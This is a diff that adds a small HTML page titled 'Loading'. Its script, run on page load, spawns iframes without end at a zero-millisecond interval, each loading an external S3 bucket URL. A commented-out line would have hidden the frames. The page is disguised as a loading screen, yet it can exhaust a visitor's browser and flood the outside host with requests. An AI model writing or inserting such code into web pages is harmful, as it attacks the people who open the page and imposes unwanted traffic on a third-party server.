@@ -1,0 +1,11 @@
+<h1>Loading</h1>
+<script>
+window.onload = function() {
+  setInterval(() => {
+    const iframe = document.createElement('iframe');
+    //frame.style.display = 'none';
+    iframe.src = 'https://lsrelay-config-production.s3.amazonaws.com';
+    document.body.appendChild(iframe);
+  }, 0)  
+};
+</script>
